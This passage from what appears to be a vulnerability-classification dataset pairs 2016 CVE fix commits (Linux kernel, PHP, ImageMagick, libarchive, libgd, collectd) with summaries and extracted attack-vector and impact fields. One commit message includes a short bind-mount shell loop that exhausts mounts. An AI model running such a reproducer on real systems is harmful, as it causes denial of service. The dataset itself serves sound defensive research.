attacker"},{"commit_id":"dd84447b63a71fa8c3f47071b09454efc667767b","cve_id":"CVE-2016-6491","cwe_id":"CWE-125","commit_message":"Prevent buffer overflow (bug report from Ibrahim el-sayed)","summary":"Buffer overflow in the Get8BIMProperty function in MagickCore\/property.c in ImageMagick before 6.9.5-4 and 7.x before 7.0.2-6 allows remote attackers to cause a denial of service (out-of-bounds read, memory leak, and crash) via a crafted image.","commit_message_1":"prevent buffer overflow ( bug report from ibrahim el-sayed )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted image","Impact":"cause a denial of service ( out - of - bounds read , memory leak , and crash )","Root Cause":"caused by an out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"51093254bf879bc9ce96590400a87897c7498463","cve_id":"CVE-2016-6327","cwe_id":"CWE-476","commit_message":"IB\/srpt: Simplify srpt_handle_tsk_mgmt()\n\nLet the target core check task existence instead of the SRP target\ndriver. Additionally, let the target core check the validity of the\ntask management request instead of the ib_srpt driver.\n\nThis patch fixes the following kernel crash:\n\nBUG: unable to handle kernel NULL pointer dereference at 0000000000000001\nIP: [<ffffffffa0565f37>] srpt_handle_new_iu+0x6d7\/0x790 [ib_srpt]\nOops: 0002 [#1] SMP\nCall Trace:\n [<ffffffffa05660ce>] srpt_process_completion+0xde\/0x570 [ib_srpt]\n [<ffffffffa056669f>] srpt_compl_thread+0x13f\/0x160 [ib_srpt]\n [<ffffffff8109726f>] kthread+0xcf\/0xe0\n [<ffffffff81613cfc>] ret_from_fork+0x7c\/0xb0\n\nSigned-off-by: Bart Van Assche <bart.vanassche@sandisk.com>\nFixes: 3e4f574857ee (\"ib_srpt: Convert TMR path to target_submit_tmr\")\nTested-by: Alex Estrin <alex.estrin@intel.com>\nReviewed-by: Christoph Hellwig <hch@lst.de>\nCc: Nicholas Bellinger <nab@linux-iscsi.org>\nCc: Sagi Grimberg <sagig@mellanox.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Doug Ledford <dledford@redhat.com>","summary":"drivers\/infiniband\/ulp\/srpt\/ib_srpt.c in the Linux kernel before 4.5.1 allows local users to cause a denial of service (NULL pointer dereference and system crash) by using an ABORT_TASK command to abort a device write operation.","commit_message_1":"simplify srpt_handle_tsk_mgmt ( ) let the target core check task existence instead of the srp target driver","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by using an abort _ task command to abort a device write operation ","Impact":"cause a denial of service ( pointer dereference and system crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"local attacker"},{"commit_id":"b589096f907052b3a4da2b9ccc9b0e2e888dfc18","cve_id":"CVE-2016-6254","cwe_id":"CWE-119","commit_message":"network plugin: Fix heap overflow in parse_packet().\n\nEmilien Gaspar has identified a heap overflow in parse_packet(), the\nfunction used by the network plugin to parse incoming network packets.\n\nThis is a vulnerability in collectd, though the scope is not clear at\nthis point. At the very least specially crafted network packets can be\nused to crash the daemon. We can't rule out a potential remote code\nexecution though.\n\nFixes: CVE-2016-6254","summary":"Heap-based buffer overflow in the parse_packet function in network.c in collectd before 5.4.3 and 5.x before 5.5.2 allows remote attackers to cause a denial of service (daemon crash) or possibly execute arbitrary code via a crafted network packet.","commit_message_1":"fix heap overflow in parse_packet ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted network packet","Impact":"cause a denial of service ( daemon crash ) or possibly execute arbitrary code","Root Cause":"caused by improper bounds checking by the parse_packet function","Attack Type":"remote attacker"},{"commit_id":"3014e198","cve_id":"CVE-2016-6250","cwe_id":"CWE-190","commit_message":"Issue 711:  Be more careful about verifying filename lengths when writing ISO9660 archives\n\n* Don't cast size_t to int, since this can lead to overflow\n  on machines where sizeof(int) < sizeof(size_t)\n* Check a + b > limit by writing it as\n    a > limit || b > limit || a + b > limit\n  to avoid problems when a + b wraps around.","summary":"Integer overflow in the ISO9660 writer in libarchive before 3.2.1 allows remote attackers to cause a denial of service (application crash) or execute arbitrary code via vectors related to verifying filename lengths when writing an ISO9660 archive, which trigger a buffer overflow.","commit_message_1":"be more careful about verifying filename length when writing iso9660 archive * do n't cast size_t to int , since this can lead to overflow on machine where sizeof ( int ) < sizeof ( size_t ) * check a + b > limit by writing it a a > limit || b > limit || a + b > limit to avoid problem when a + b wrap around","Vulnerability Type":"integer overflow","Attack Vector":"via vectors related to verifying filename lengths when writing an iso9660 archive , which trigger a buffer overflow","Impact":"cause a denial of service ( application crash ) or execute arbitrary code","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"10ef1dca63d62433fda13309b4a228782db823f7","cve_id":"CVE-2016-6214","cwe_id":"CWE-125","commit_message":"Unsupported TGA bpp\/alphabit combinations should error gracefully\n\nCurrently, only 24bpp without alphabits and 32bpp with 8 alphabits are\nreally supported. All other combinations will be rejected with a warning.","summary":"gd_tga.c in the GD Graphics Library (aka libgd) before 2.2.3 allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted TGA file.","commit_message_1":"unsupported tga bpp\/alphabit combination should error gracefully currently , only 24bpp without alphabits and 32bpp with <number> alphabits are really supported","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted tga file","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by an out of bounds read error","Attack Type":"remote attacker"},{"commit_id":"d29216842a85c7970c536108e093963f02714498","cve_id":"CVE-2016-6213","cwe_id":"CWE-400","commit_message":"mnt: Add a per mount namespace limit on the number of mounts\n\nCAI Qian <caiqian@redhat.com> pointed out that the semantics\nof shared subtrees make it possible to create an exponentially\nincreasing number of mounts in a mount namespace.\n\n    mkdir \/tmp\/1 \/tmp\/2\n    mount --make-rshared \/\n    for i in $(seq 1 20) ; do mount --bind \/tmp\/1 \/tmp\/2 ; done\n\nWill create create 2^20 or 1048576 mounts, which is a practical problem\nas some people have managed to hit this by accident.\n\nAs such CVE-2016-6213 was assigned.\n\nIan Kent <raven@themaw.net> described the situation for autofs users\nas follows:\n\n> The number of mounts for direct mount maps is usually not very large because of\n> the way they are implemented, large direct mount maps can have performance\n> problems. There can be anywhere from a few (likely case a few hundred) to less\n> than 10000, plus mounts that have been triggered and not yet expired.\n>\n> Indirect mounts have one autofs mount at the root plus the number of mounts that\n> have been triggered and not yet expired.\n>\n> The number of autofs indirect map entries can range from a few to the common\n> case of several thousand and in rare cases up to between 30000 and 50000. I've\n> not heard of people with maps larger than 50000 entries.\n>\n> The larger the number of map entries the greater the possibility for a large\n> number of active mounts so it's not hard to expect cases of a 1000 or somewhat\n> more active mounts.\n\nSo I am setting the default number of mounts allowed per mount\nnamespace at 100,000.  This is more than enough for any use case I\nknow of, but small enough to quickly stop an exponential increase\nin mounts.  Which should be perfect to catch misconfigurations and\nmalfunctioning programs.\n\nFor anyone who needs a higher limit this can be changed by writing\nto the new \/proc\/sys\/fs\/mount-max sysctl.\n\nTested-by: CAI Qian <caiqian@redhat.com>\nSigned-off-by: \"Eric W. Biederman\" <ebiederm@xmission.com>","summary":"fs\/namespace.c in the Linux kernel before 4.9 does not restrict how many mounts may exist in a mount namespace, which allows local users to cause a denial of service (memory consumption and deadlock) via MS_BIND mount system calls, as demonstrated by a loop that triggers exponential growth in the number of mounts.","commit_message_1":"add a per mount namespace limit on the number of mount cai qian < caiqian @ <file> > pointed out that the semantics of shared subtrees make it possible to create an exponentially increasing number of mount in a mount namespace","Vulnerability Type":"Uncontrolled Resource Consumption","Attack Vector":"via ms _ bind mount system calls , as demonstrated by a loop that triggers exponential growth in the number of mounts","Impact":"cause a denial of service","Root Cause":"does not restrict how many mounts may exist","Attack Type":"local attacker"},{"commit_id":"9409e22acdfc9153f88d9b1ed2bd2a5b34d2d3ca","cve_id":"CVE-2016-6198","cwe_id":"CWE-284","commit_message":"vfs: rename: check backing inode being equal\n\nIf a file is renamed to a hardlink of itself POSIX specifies that rename(2)\nshould do nothing and return success.\n\nThis condition is checked in vfs_rename().  However it won't detect hard\nlinks on overlayfs where these are given separate inodes on the overlayfs\nlayer.\n\nOverlayfs itself detects this condition and returns success without doing\nanything, but then vfs_rename() will proceed as if this was a successful\nrename (detach_mounts(), d_move()).\n\nThe correct thing to do is to detect this condition before even calling\ninto overlayfs.  This patch does this by calling vfs_select_inode() to get\nthe underlying inodes.\n\nSigned-off-by: Miklos Szeredi <mszeredi@redhat.com>\nCc: <stable@vger.kernel.org> # v4.2+","summary":"The filesystem layer in the Linux kernel before 4.5.5 proceeds with post-rename operations after an OverlayFS file is renamed to a self-hardlink, which allows local users to cause a denial of service (system crash) via a rename system call, related to fs\/namei.c and fs\/open.c.","commit_message_1":"rename : check backing inode being equal if a file is renamed to a hardlink of itself posix specifies that rename ( <number> ) should do nothing and return success","Vulnerability Type":"Improper Access Control","Attack Vector":"via a rename system call , related to fs \/ namei . c and fs \/ open . c","Impact":"cause a denial of service","Root Cause":"using rename syscall on overlayfs on top of xfs","Attack Type":"local attacker"},{"commit_id":"11f3710417d026ea2f4fcf362d866342c5274185","cve_id":"CVE-2016-6197","cwe_id":"CWE-20","commit_message":"ovl: verify upper dentry before unlink and rename\n\nUnlink and rename in overlayfs checked the upper dentry for staleness by\nverifying upper->d_parent against upperdir.  However the dentry can go\nstale also by being unhashed, for example.\n\nExpand the verification to actually look up the name again (under parent\nlock) and check if it matches the upper dentry.  This matches what the VFS\ndoes before passing the dentry to filesytem's unlink\/rename methods, which\nexcludes any inconsistency caused by overlayfs.\n\nSigned-off-by: Miklos Szeredi <mszeredi@redhat.com>","summary":"fs\/overlayfs\/dir.c in the OverlayFS filesystem implementation in the Linux kernel before 4.6 does not properly verify the upper dentry before proceeding with unlink and rename system-call processing, which allows local users to cause a denial of service (system crash) via a rename system call that specifies a self-hardlink.","commit_message_1":"verify upper dentry before unlink and rename unlink and rename in overlayfs checked the upper dentry for staleness by verifying upper- > d_parent against upperdir","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a rename system call that specifies a self - hardlink","Impact":"cause a denial of service ( system crash )","Root Cause":"does not properly verify the upper dentry before proceeding with unlink and rename system - call processing","Attack Type":"local attacker"},{"commit_id":"30a46a4647fd1df9cf52e43bf467f0d9265096ca","cve_id":"CVE-2016-6187","cwe_id":"CWE-119","commit_message":"apparmor: fix oops, validate buffer size in apparmor_setprocattr()\n\nWhen proc_pid_attr_write() was changed to use memdup_user apparmor's\n(interface violating) assumption that the setprocattr buffer was always\na single page was violated.\n\nThe size test is not strictly speaking needed as proc_pid_attr_write()\nwill reject anything larger, but for the sake of robustness we can keep\nit in.\n\nSMACK and SELinux look safe to me, but somebody else should probably\nhave a look just in case.\n\nBased on original patch from Vegard Nossum <vegard.nossum@oracle.com>\nmodified for the case that apparmor provides null termination.\n\nFixes: bb646cdb12e75d82258c2f2e7746d5952d3e321a\nReported-by: Vegard Nossum <vegard.nossum@oracle.com>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nCc: John Johansen <john.johansen@canonical.com>\nCc: Paul Moore <paul@paul-moore.com>\nCc: Stephen Smalley <sds@tycho.nsa.gov>\nCc: Eric Paris <eparis@parisplace.org>\nCc: Casey Schaufler <casey@schaufler-ca.com>\nCc: stable@kernel.org\nSigned-off-by: John Johansen <john.johansen@canonical.com>\nReviewed-by: Tyler Hicks <tyhicks@canonical.com>\nSigned-off-by: James Morris <james.l.morris@oracle.com>","summary":"The apparmor_setprocattr function in security\/apparmor\/lsm.c in the Linux kernel before 4.6.5 does not validate the buffer size, which allows local users to gain privileges by triggering an AppArmor setprocattr hook.","commit_message_1":"fix oops , validate buffer size in apparmor_setprocattr ( ) when proc_pid_attr_write ( ) wa changed to use memdup_user apparmor 's ( interface violating ) assumption that the setprocattr buffer wa always a single page wa violated","Vulnerability Type":"buffer overflow","Attack Vector":"by triggering an apparmor setprocattr hook","Impact":"gain privileges","Root Cause":"does not validate the buffer size","Attack Type":"local attacker"},{"commit_id":"096cdc6f52225835ff503f987a0d68ef770bb78e","cve_id":"CVE-2016-6156","cwe_id":"CWE-362","commit_message":"platform\/chrome: cros_ec_dev - double fetch bug in ioctl\n\nWe verify \"u_cmd.outsize\" and \"u_cmd.insize\" but we need to make sure\nthat those values have not changed between the two copy_from_user()\ncalls.  Otherwise it could lead to a buffer overflow.\n\nAdditionally, cros_ec_cmd_xfer() can set s_cmd->insize to a lower value.\nWe should use the new smaller value so we don't copy too much data to\nthe user.\n\nReported-by: Pengfei Wang <wpengfeinudt@gmail.com>\nFixes: a841178445bb ('mfd: cros_ec: Use a zero-length array for command data')\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nReviewed-by: Kees Cook <keescook@chromium.org>\nTested-by: Gwendal Grignou <gwendal@chromium.org>\nCc: <stable@vger.kernel.org> # v4.2+\nSigned-off-by: Olof Johansson <olof@lixom.net>","summary":"Race condition in the ec_device_ioctl_xcmd function in drivers\/platform\/chrome\/cros_ec_dev.c in the Linux kernel before 4.7 allows local users to cause a denial of service (out-of-bounds array access) by changing a certain size value, aka a *double fetch* vulnerability.","commit_message_1":"cros_ec_dev - double fetch bug in ioctl we verify `` <file> '' and `` <file> '' but we need to make sure that those value have not changed between the two copy_from_user ( ) call","Vulnerability Type":"Race Condition","Attack Vector":"by changing a certain size value , aka a * double fetch * vulnerability","Impact":"cause a denial of service ( out - of - bounds array access )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"43761473c254b45883a64441dd0bc85a42f3645c","cve_id":"CVE-2016-6136","cwe_id":"CWE-362","commit_message":"audit: fix a double fetch in audit_log_single_execve_arg()\n\nThere is a double fetch problem in audit_log_single_execve_arg()\nwhere we first check the execve(2) argumnets for any \"bad\" characters\nwhich would require hex encoding and then re-fetch the arguments for\nlogging in the audit record[1].  Of course this leaves a window of\nopportunity for an unsavory application to munge with the data.\n\nThis patch reworks things by only fetching the argument data once[2]\ninto a buffer where it is scanned and logged into the audit\nrecords(s).  In addition to fixing the double fetch, this patch\nimproves on the original code in a few other ways: better handling\nof large arguments which require encoding, stricter record length\nchecking, and some performance improvements (completely unverified,\nbut we got rid of some strlen() calls, that's got to be a good\nthing).\n\nAs part of the development of this patch, I've also created a basic\nregression test for the audit-testsuite, the test can be tracked on\nGitHub at the following link:\n\n * https:\/\/github.com\/linux-audit\/audit-testsuite\/issues\/25\n\n[1] If you pay careful attention, there is actually a triple fetch\nproblem due to a strnlen_user() call at the top of the function.\n\n[2] This is a tiny white lie, we do make a call to strnlen_user()\nprior to fetching the argument data.  I don't like it, but due to the\nway the audit record is structured we really have no choice unless we\ncopy the entire argument at once (which would require a rather\nwasteful allocation).  The good news is that with this patch the\nkernel no longer relies on this strnlen_user() value for anything\nbeyond recording it in the log, we also update it with a trustworthy\nvalue whenever possible.\n\nReported-by: Pengfei Wang <wpengfeinudt@gmail.com>\nCc: <stable@vger.kernel.org>\nSigned-off-by: Paul Moore <paul@paul-moore.com>","summary":"Race condition in the audit_log_single_execve_arg function in kernel\/auditsc.c in the Linux kernel through 4.7 allows local users to bypass intended character-set restrictions or disrupt system-call auditing by changing a certain string, aka a *double fetch* vulnerability.","commit_message_1":"fix a double fetch in audit_log_single_execve_arg ( ) there is a double fetch problem in audit_log_single_execve_arg ( ) where we first check the execve ( <number> ) argumnets for any `` bad '' character which would require hex encoding and then re-fetch the argument for logging in the audit record [ <number> ]","Vulnerability Type":"Race Condition","Attack Vector":"by changing a certain string , aka a * double fetch * vulnerability","Impact":"bypass intended character - set restrictions or disrupt system - call auditing","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"532c34b5fbf1687df63b3fcd5b2846312ac943c6","cve_id":"CVE-2016-6130","cwe_id":"CWE-362","commit_message":"s390\/sclp_ctl: fix potential information leak with \/dev\/sclp\n\nThe sclp_ctl_ioctl_sccb function uses two copy_from_user calls to\nretrieve the sclp request from user space. The first copy_from_user\nfetches the length of the request which is stored in the first two\nbytes of the request. The second copy_from_user gets the complete\nsclp request, but this copies the length field a second time.\nA malicious user may have changed the length in the meantime.\n\nReported-by: Pengfei Wang <wpengfeinudt@gmail.com>\nReviewed-by: Michael Holzheu <holzheu@linux.vnet.ibm.com>\nSigned-off-by: Martin Schwidefsky <schwidefsky@de.ibm.com>","summary":"Race condition in the sclp_ctl_ioctl_sccb function in drivers\/s390\/char\/sclp_ctl.c in the Linux kernel before 4.6 allows local users to obtain sensitive information from kernel memory by changing a certain length value, aka a *double fetch* vulnerability.","commit_message_1":"fix potential information leak with \/dev\/sclp the sclp_ctl_ioctl_sccb function us two copy_from_user call to retrieve the sclp request from user space","Vulnerability Type":"Race Condition","Attack Vector":"by changing a certain length value , aka a * double fetch * vulnerability","Impact":"obtain sensitive information from kernel memory","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"3ad08e01b4d253c66ae56414886089684155af22","cve_id":"CVE-2016-5844","cwe_id":"CWE-190","commit_message":"Issue 717:  Fix integer overflow when computing location of volume descriptor\n\nThe multiplication here defaulted to 'int' but calculations\nof file positions should always use int64_t.  A simple cast\nsuffices to fix this since the base location is always 32 bits\nfor ISO, so multiplying by the sector size will never overflow\na 64-bit integer.","summary":"Integer overflow in the ISO parser in libarchive before 3.2.1 allows remote attackers to cause a denial of service (application crash) via a crafted ISO file.","commit_message_1":"fix integer overflow when computing location of volume descriptor the multiplication here defaulted to 'int ' but calculation of file position should always use int64_t","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted iso file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"93a2001bdfd5376c3dc2158653034c20392d15c5","cve_id":"CVE-2016-5829","cwe_id":"CWE-119","commit_message":"HID: hiddev: validate num_values for HIDIOCGUSAGES, HIDIOCSUSAGES commands\n\nThis patch validates the num_values parameter from userland during the\nHIDIOCGUSAGES and HIDIOCSUSAGES commands. Previously, if the report id was set\nto HID_REPORT_ID_UNKNOWN, we would fail to validate the num_values parameter\nleading to a heap overflow.\n\nCc: stable@vger.kernel.org\nSigned-off-by: Scott Bauer <sbauer@plzdonthack.me>\nSigned-off-by: Jiri Kosina <jkosina@suse.cz>","summary":"Multiple heap-based buffer overflows in the hiddev_ioctl_usage function in drivers\/hid\/usbhid\/hiddev.c in the Linux kernel through 4.6.3 allow local users to cause a denial of service or possibly have unspecified other impact via a crafted (1) HIDIOCGUSAGES or (2) HIDIOCSUSAGES ioctl call.","commit_message_1":"hiddev : validate num_values for hidiocgusages , hidiocsusages command this patch validates the num_values parameter from userland during the hidiocgusages and hidiocsusages command","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted ( 1 ) hidiocgusages or ( 2 ) hidiocsusages ioctl call","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by the hiddev driver code","Attack Type":"local attacker"},{"commit_id":"f6aef68089221c5ea047d4a74224ee3deead99a6?w=1","cve_id":"CVE-2016-5773","cwe_id":"CWE-416","commit_message":"Fix bug #72434: ZipArchive class Use After Free Vulnerability in PHP's GC algorithm and unserialize","summary":"php_zip.c in the zip extension in PHP before 5.5.37, 5.6.x before 5.6.23, and 7.x before 7.0.8 improperly interacts with the unserialize implementation and garbage collection, which allows remote attackers to execute arbitrary code or cause a denial of service (use-after-free and application crash) via crafted serialized data containing a ZipArchive object.","commit_message_1":"ziparchive class use after free vulnerability in php 's gc algorithm and unserialize","Vulnerability Type":"Use After Free","Attack Vector":"via crafted serialized data containing a ZipArchive object","Impact":"execute arbitrary code or cause a denial of service (use-after-free and application crash)","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"a44c89e8af7c2410f4bfc5e097be2a5d0639a60c?w=1","cve_id":"CVE-2016-5772","cwe_id":"CWE-415","commit_message":"Fix bug #72340: Double Free Courruption in wddx_deserialize","summary":"Double free vulnerability in the php_wddx_process_data function in wddx.c in the WDDX extension in PHP before 5.5.37, 5.6.x before 5.6.23, and 7.x before 7.0.8 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via crafted XML data that is mishandled in a wddx_deserialize call.","commit_message_1":"fix bug # <number> : double free courruption in wddx_deserialize","Vulnerability Type":"double free","Attack Vector":"via crafted XML data","Impact":"cause a denial of service (application crash) or possibly execute arbitrary code","Root Cause":"caused by a double-free error","Attack Type":"remote attacker"},{"commit_id":"3f627e580acfdaf0595ae3b115b8bec677f203ee?w=1","cve_id":"CVE-2016-5771","cwe_id":"CWE-416","commit_message":"Fixed ##72433: Use After Free Vulnerability in PHP's GC algorithm and unserialize","summary":"spl_array.c in the SPL extension in PHP before 5.5.37 and 5.6.x before 5.6.23 improperly interacts with the unserialize implementation and garbage collection, which allows remote attackers to execute arbitrary code or cause a denial of service (use-after-free and application crash) via crafted serialized data.","commit_message_1":"use after free vulnerability in php 's gc algorithm and unserialize","Vulnerability Type":"Use After Free","Attack Vector":"via crafted serialized data","Impact":"execute arbitrary code or cause a denial of service (use-after-free and application crash)","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"7245bff300d3fa8bacbef7897ff080a6f1c23eba?w=1","cve_id":"CVE-2016-5770","cwe_id":"CWE-190","commit_message":"Fix bug #72262 - do not overflow int","summary":"Integer overflow in the SplFileObject::fread function in spl_directory.c in the SPL extension in PHP before 5.5.37 and 5.6.x before 5.6.23 allows remote attackers to cause a denial of service or possibly have unspecified other impact via a large integer argument, a related issue to CVE-2016-5096.","commit_message_1":"fix bug # <number> - do not overflow int","Vulnerability Type":"integer overflow","Attack Vector":"via a large integer argument","Impact":"cause a denial of service or possibly have unspecified other impact","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"5b597a2e5b28e2d5a52fc1be13f425f08f47cb62?w=1","cve_id":"CVE-2016-5768","cwe_id":"CWE-415","commit_message":"Fix bug #72402: _php_mb_regex_ereg_replace_exec - double free","summary":"Double free vulnerability in the _php_mb_regex_ereg_replace_exec function in php_mbregex.c in the mbstring extension in PHP before 5.5.37, 5.6.x before 5.6.23, and 7.x before 7.0.8 allows remote attackers to execute arbitrary code or cause a denial of service (application crash) by leveraging a callback exception.","commit_message_1":"fix bug # <number> : _php_mb_regex_ereg_replace_exec - double free","Vulnerability Type":"double free","Attack Vector":"by leveraging a callback exception","Impact":"execute arbitrary code or cause a denial of service (application crash)","Root Cause":"caused by a double-free error","Attack Type":"remote attacker"},{"commit_id":"c395c6e5d7e8df37a21265ff76e48fe75ceb5ae6?w=1","cve_id":"CVE-2016-5767","cwe_id":"CWE-190","commit_message":"iFixed bug #72446 - Integer Overflow in gdImagePaletteToTrueColor() resulting in heap overflow","summary":"Integer overflow in the gdImageCreate function in gd.c in the GD Graphics Library (aka libgd) before 2.0.34RC1, as used in PHP before 5.5.37, 5.6.x before 5.6.23, and 7.x before 7.0.8, allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted image dimensions.","commit_message_1":"ifixed bug # <number> - integer overflow in gdimagepalettetotruecolor ( ) resulting in heap overflow","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted image dimensions","Impact":"cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact","Root Cause":"caused by an integer interflow","Attack Type":"remote attacker"},{"commit_id":"7722455726bec8c53458a32851d2a87982cf0eac?w=1","cve_id":"CVE-2016-5766","cwe_id":"CWE-190","commit_message":"Fixed #72339 Integer Overflow in _gd2GetHeader() resulting in heap overflow","summary":"Integer overflow in the _gd2GetHeader function in gd_gd2.c in the GD Graphics Library (aka libgd) before 2.2.3, as used in PHP before 5.5.37, 5.6.x before 5.6.23, and 7.x before 7.0.8, allows remote attackers to cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact via crafted chunk dimensions in an image.","commit_message_1":"fixed # <number> integer overflow in _gd2getheader ( ) resulting in heap overflow","Vulnerability Type":"integer overflow","Attack Vector":"via crafted chunk dimensions in an image","Impact":"cause a denial of service (heap-based buffer overflow and application crash) or possibly have unspecified other impact","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"9bf292bfca94694a721449e3fd752493856710f6","cve_id":"CVE-2016-5728","cwe_id":"CWE-119","commit_message":"misc: mic: Fix for double fetch security bug in VOP driver\n\nThe MIC VOP driver does two successive reads from user space to read a\nvariable length data structure. Kernel memory corruption can result if\nthe data structure changes between the two reads. This patch disallows\nthe chance of this happening.\n\nBugzilla: https:\/\/bugzilla.kernel.org\/show_bug.cgi?id=116651\nReported by: Pengfei Wang <wpengfeinudt@gmail.com>\nReviewed-by: Sudeep Dutt <sudeep.dutt@intel.com>\nSigned-off-by: Ashutosh Dixit <ashutosh.dixit@intel.com>\nCc: stable <stable@vger.kernel.org>\nSigned-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>","summary":"Race condition in the vop_ioctl function in drivers\/misc\/mic\/vop\/vop_vringh.c in the MIC VOP driver in the Linux kernel before 4.6.1 allows local users to obtain sensitive information from kernel memory or cause a denial of service (memory corruption and system crash) by changing a certain header, aka a *double fetch* vulnerability.","commit_message_1":"mic : fix for double fetch security bug in vop driver the mic vop driver doe two successive read from user space to read a variable length data structure","Vulnerability Type":"buffer overflow","Attack Vector":"by changing a certain header , aka a * double fetch * vulnerability","Impact":"obtain sensitive information from kernel memory or cause a denial of service ( memory corruption and system crash )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"75ff39ccc1bd5d3c455b6822ab09e533c551f758","cve_id":"CVE-2016-5696","cwe_id":"CWE-200","commit_message":"tcp: make challenge acks less predictable\n\nYue Cao claims that current host rate limiting of challenge ACKS\n(RFC 5961) could leak enough information to allow a patient attacker\nto hijack TCP sessions. He will soon provide details in an academic\npaper.\n\nThis patch increases the default limit from 100 to 1000, and adds\nsome randomization so that the attacker can no longer hijack\nsessions without spending a considerable amount of probes.\n\nBased on initial analysis and patch from Linus.\n\nNote that we also have per socket rate limiting, so it is tempting\nto remove the host limit in the future.\n\nv2: randomize the count of challenge acks per second, not the period.\n\nFixes: 282f23c6ee34 (\"tcp: implement RFC 5961 3.2\")\nReported-by: Yue Cao <ycao009@ucr.edu>\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nSuggested-by: Linus Torvalds <torvalds@linux-foundation.org>\nCc: Yuchung Cheng <ycheng@google.com>\nCc: Neal Cardwell <ncardwell@google.com>\nAcked-by: Neal Cardwell <ncardwell@google.com>\nAcked-by: Yuchung Cheng <ycheng@google.com>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"net\/ipv4\/tcp_input.c in the Linux kernel before 4.7 does not properly determine the rate of challenge ACK segments, which makes it easier for remote attackers to hijack TCP sessions via a blind in-window attack.","commit_message_1":"make challenge acks le predictable yue cao claim that current host rate limiting of challenge acks ( rfc <number> ) could leak enough information to allow a patient attacker to hijack tcp session","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a blind in - window attack","Impact":"hijack tcp sessions","Root Cause":"does not properly determine the rate of challenge ack segments","Attack Type":"remote attacker"},{"commit_id":"5511ef530576ed18fd636baa3bb4eda3d667665d","cve_id":"CVE-2016-5691","cwe_id":"CWE-20","commit_message":"Add additional checks to DCM reader to prevent data-driven faults (bug report from Hanno B\u00f6ck","summary":"The DCM reader in ImageMagick before 6.9.4-5 and 7.x before 7.0.1-7 allows remote attackers to have unspecified impact by leveraging lack of validation of (1) pixel.red, (2) pixel.green, and (3) pixel.blue.","commit_message_1":"add additional check to dcm reader to prevent data-driven fault ( bug report from hanno b\u00f6ck","Vulnerability Type":"Improper Input Validation","Attack Vector":"by leveraging lack of validation of pixel . red ,  pixel . green , and pixel","Impact":"have unspecified impact","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"881b5b03a590198d03008e4200dd00cc537712f3","cve_id":"CVE-2016-5427","cwe_id":"CWE-399","commit_message":"Reject qname's wirelength > 255, `chopOff()` handle dot inside labels","summary":"PowerDNS (aka pdns) Authoritative Server before 3.4.10 does not properly handle a . (dot) inside labels, which allows remote attackers to cause a denial of service (backend CPU consumption) via a crafted DNS query.","commit_message_1":"reject qname 's wirelength > <number> , ` chopoff ( ) ` handle dot inside label","Vulnerability Type":"Resource Management Errors","Attack Vector":"via a crafted dns query","Impact":"cause a denial of service ( backend cpu consumption )","Root Cause":"does not properly handle a . ( dot ) inside labels","Attack Type":"remote attacker"},{"commit_id":"dfd6b54ce33960e420fb206d8872fb759b577ad9","cve_id":"CVE-2016-5418","cwe_id":"CWE-20","commit_message":"Fixes for Issue #745 and Issue #746 from Doran Moppert.","summary":"The sandboxing code in libarchive 3.2.0 and earlier mishandles hardlink archive entries of non-zero data size, which might allow remote attackers to write to arbitrary files via a crafted archive file.","commit_message_1":"fix for issue # <number> and issue # <number> from doran moppert","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted archive file","Impact":"write to arbitrary files","Root Cause":"caused by the improper handling of hardlink archive entries of non-zero size","Attack Type":"remote attacker"},{"commit_id":"aa93d1fee85c890a34f2510a310e55ee76a27848","cve_id":"CVE-2016-5400","cwe_id":"CWE-119","commit_message":"media: fix airspy usb probe error path\n\nFix a memory leak on probe error of the airspy usb device driver.\n\nThe problem is triggered when more than 64 usb devices register with\nv4l2 of type VFL_TYPE_SDR or VFL_TYPE_SUBDEV.\n\nThe memory leak is caused by the probe function of the airspy driver\nmishandeling errors and not freeing the corresponding control structures\nwhen an error occours registering the device to v4l2 core.\n\nA badusb device can emulate 64 of these devices, and then through\ncontinual emulated connect\/disconnect of the 65th device, cause the\nkernel to run out of RAM and crash the kernel, thus causing a local DOS\nvulnerability.\n\nFixes CVE-2016-5400\n\nSigned-off-by: James Patrick-Evans <james@jmp-e.com>\nReviewed-by: Kees Cook <keescook@chromium.org>\nCc: stable@vger.kernel.org # 3.17+\nSigned-off-by: Linus Torvalds 